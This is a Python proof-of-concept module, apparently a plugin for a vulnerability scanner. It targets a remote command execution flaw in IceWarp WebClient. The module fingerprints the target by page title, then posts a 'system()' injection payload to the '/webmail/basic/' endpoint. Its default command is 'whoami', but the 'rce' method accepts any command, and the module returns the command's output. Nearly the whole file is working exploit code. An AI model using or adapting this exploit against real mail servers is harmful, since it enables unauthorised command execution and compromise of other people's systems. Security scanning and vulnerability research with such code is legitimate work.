# -*- coding:utf-8 -*-
# IceWarp WebClient  远程命令执行

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = ""

    def rce(self, cmd="whoami"):
        resp = self.requestUtil.post(self.service.url + "/webmail/basic/",
                                     data=f"_dlg[captcha][target]=system(\\\'{cmd}\\\')\\")
        try:
            output = resp.text.split("<!-- Webmail Basic -->")[0]
            self.result = output
            return self.result
        except:
            pass

    def fingerprint(self):
        try:
            if self.service.title == "ICEWARP WEBCLIENT":
                return True
        except:
            return False

    def poc(self):
        try:
            self.rce()
            if self.result and 1 < len(self.result) < 50:
                return ["IceWarp WebClient  远程命令执行", "当前用户: <br>%s" % self.result]
        except:
            return []
